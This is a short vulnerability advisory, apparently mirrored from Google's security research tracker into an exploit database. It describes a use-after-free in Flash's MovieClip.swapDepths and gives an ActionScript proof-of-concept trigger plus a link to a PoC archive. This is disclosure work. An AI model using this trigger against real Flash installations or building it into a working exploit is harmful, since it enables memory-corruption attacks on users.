@@ -1,0 +1,25 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=403&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id
+
+There is a use-after-free in MovieClip.swapDepths, a POC is as follows:
+
+var clip1 = this.createEmptyMovieClip("clip1", 1);
+var clip2 = this.createEmptyMovieClip("clip2", 2);
+
+var n = {valueOf: func, toString: func};
+
+clip1.swapDepths(n);
+
+function func(){
+	
+	clip1.removeMovieClip();
+	//_root.createEmptyMovieClip("test", 1);
+	
+	trace("here");
+	return "clip2";
+	}
+
+A swf and fla are attached.
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/37871.zip
+
